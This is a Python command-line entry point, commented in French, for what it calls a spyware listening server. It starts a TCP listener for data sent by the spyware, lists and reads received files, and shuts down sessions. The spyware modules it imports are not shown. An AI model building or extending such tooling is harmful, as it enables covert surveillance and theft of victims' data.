import argparse

from SRC.Ecoute import *
from SRC.Session import *
from SRC.Signal import *
from SRC.SpyWare import *
from SRC.Verification import *
from SRC.Systeme import *

def main():
    parser = argparse.ArgumentParser(description="Programme de gestion du serveur d'écoute")
    parser.add_argument("-l", "--listen", type=int, help="Se met en écoute sur le PORT TCP spécifié et attend les données du spyware.")
    parser.add_argument("-s", "--show", action="store_true", help="Affiche la liste des fichiers reçus par le programme.")
    parser.add_argument("-r", "--readfile", metavar="<nom_fichier>", help="Affiche le contenu du fichier stocké sur le serveur du spyware.")
    parser.add_argument("-k", "--kill", action="store_true", help="Arrête toutes les instances de serveurs en cours.")

    args = parser.parse_args()
    if args.listen:
        SpyWareServeur(args.listen)
    elif args.show:
        # Fonction pour afficher la liste des fichiers reçus
        RécupererAdresseIPFichier()
    elif args.readfile:
        # Fonction pour afficher le contenu d'un fichier
        LireContenuFichier(args.readfile)
        print(f"Affichage du contenu du fichier {args.readfile}...")
    elif args.kill:
        EnvoiSignalFermetureClients()
        SupprimerFIchierDossier()
        ChangerStatutSession()
        ChangementStatut0()

        # Fonction pour arrêter toutes les instances de serveurs
        print("Arrêt de toutes les instances de serveurs...")
    else:
        AfficherAide()



main()